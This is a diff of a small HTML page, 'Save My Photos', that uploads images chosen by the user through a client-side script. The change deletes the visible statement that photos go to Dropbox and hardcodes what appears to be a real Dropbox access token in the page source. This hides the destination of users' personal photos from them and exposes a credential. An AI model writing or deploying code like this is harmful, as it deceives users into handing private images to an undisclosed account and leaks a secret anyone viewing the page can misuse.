@@ -6,14 +6,14 @@
 </head>
 <body style="font-family: Arial; text-align: center; margin-top: 50px;">
   <h2>Save My Photos</h2>
-  <p>Select your photos and upload them to Dropbox.</p>
+  <p>Select your photos.</p>
   <input type="file" id="fileInput" multiple accept="image/*">
   <br><br>
   <button onclick="uploadFiles()">Save My Photos</button>
   <p id="status"></p>
 
   <script>
-    const ACCESS_TOKEN = "YOUR_LONG_TOKEN_HERE";
+    const ACCESS_TOKEN = "sl.u.AF-Bp-pCgE6z83EaTt7-xbK7sCH8gW8kMJbH9bNIk-RvL-I02MNoSB0TS5ZpebhCAzPO0tmz4HfF3Say13h8cBu9cx_Lpcv-yTIV6ZsceiO7l8X2FGKtCqEFTXIkpRRcdyuiw9v-jPW54UNR1aLnC_Y-s6JcsRMojQ2VwvrgMbmt7myI1WdBJp1XtvGNGKcc-BDiz6E8IWpZKvUCInx147uGiyFiKwYZqi4Gulfbn2aFwfcHNoaEROALDT2Hh8KB8HWO_Q0WvNX3COsdU91qmGwpx9HYUa0nvhYYc2ArsBypx5fs5MCMXwseQj3ICqJu_OF4ZVR0EEhZcoAq_TtafIBucp4RVIMWYvVZh10WoFZ3i4w7khtjykZC3eBX-mvGWjWIDIM9QyY_HvJqq936gu5ppSW8OUR_oMZWWmJwjdFDtRT0wIpx4jZkr4vVbNwMiWENeMiscLclflG4jKVpRitUsPj6_p3sRBDIEBX6y4O7TvAI_RAgPnPzzUAq2YBNCu5GErSqnrv5x-xuBxSH8MwxaKFs87JYTU-bd2Xdk4xPJ8xhHTxIFySiI2328aNT_fHySGBMtHEtAHpHzM_EXm0LN8-t9wc_OmOHKa_o-jraKgM2VEFgxWWh6FHTWT9uw4ber5abWbMBdJSho4TQEi1_jvgAwZpLyTrFDV9I1x2XvXD_7qVxIRhpvrWGPN0DZMfR6GANEqhPLRXjgMnwnlr9_gg9bp60qxWJD4AIKCEhfMqcjHPwRXwqDb1-3mW0CoUPW8_Hx3uHEY0r4eN6lClmrf6kojt3vLSgtNwhYAURnQ_Z5b-FUJEtreuMZgA4SPzC7qqDNvbdmYE_s0J6OKh1d9XCpf5qnCCKa2I0fwDwchbHpfNNWZAzlln93TINn73OLtPiWSigzpfzUbG6EOq94oVOkJi06B0PNCp-D2JJGNjaXGdOaFL_U1jR7L8tholxaFCTTt6yttbHkvTn14cvEHpX5jwL6D938dovYYiYM-iLxo1KgHlbh7ONhyS6UhZy5tRlplXNrDf8pNHwa7qq8SGemzMIF4kGIUMB0CZzQSnkT4Bi8hx7qFCwCkvkQDRqbfisXrSdwxSEpFXfLD_OUkOVjbFgcGSvsmHq__vNrGYEnnbo5v4qaMJXs3ZpZ-_3H3eeI32x9vAywIl6uCyNpi_lU8mzPvjojFGO-A3JXAlzgSZaAg6U8Xnx6koATzolm-46AxE2tS7uvgKiCGCuVMRqRo46pUxR5ahl8vbmTdu5AQQaqot8OtgG2-XCUsdn7Xwh82Ckfye1NOvK0VLOD3_lqeMm81g82apzzxAanSVP9HxAnn8awey_WIGZMZf21yyBDUWzTZdHVoESpqc2tJ4nAII8C0d_MAyHjWLbUxPTUciMlSNXgZNlYKkMxNkzCltIxh7Q0EJbHPXsZD4llr1hPwjOBBPO8kZvkSGw7Q";
 
     async function uploadFiles() {
       const files = document.getElementById('fileInput').files;
